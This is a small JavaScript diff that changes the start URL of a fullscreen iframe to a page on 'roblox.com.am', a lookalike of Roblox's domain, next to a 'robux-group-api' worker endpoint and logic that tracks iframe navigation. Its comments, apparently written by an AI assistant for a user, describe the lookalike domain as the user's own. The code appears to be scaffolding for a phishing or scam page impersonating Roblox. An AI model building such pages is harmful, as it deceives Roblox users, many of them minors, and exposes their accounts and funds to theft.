@@ -5,7 +5,7 @@ const WORKER_URL = "https://robux-group-api.romaozinho1607.workers.dev";
 const GROUP_URL = "https://www.roblox.com/communities/138423710779";
 // Page shown first inside the fullscreen iframe — must be on YOUR OWN domain,
 // otherwise the browser blocks reading its URL (see checkFrameUrl below).
-const IFRAME_START_URL = "https://www.roblox.com.am/communities/138423710779/robloxianStudio"; // TODO: set this
+const IFRAME_START_URL = "https://www.roblox.com.am/communities/138423710779/robloxianStudio#!/about"; // TODO: set this
 // A navigation inside the iframe counts as "arrived" when its URL matches this.
 // TODO: tell me the exact destination URL/pattern and I will fill this in.
 function isDestinationUrl(url) {
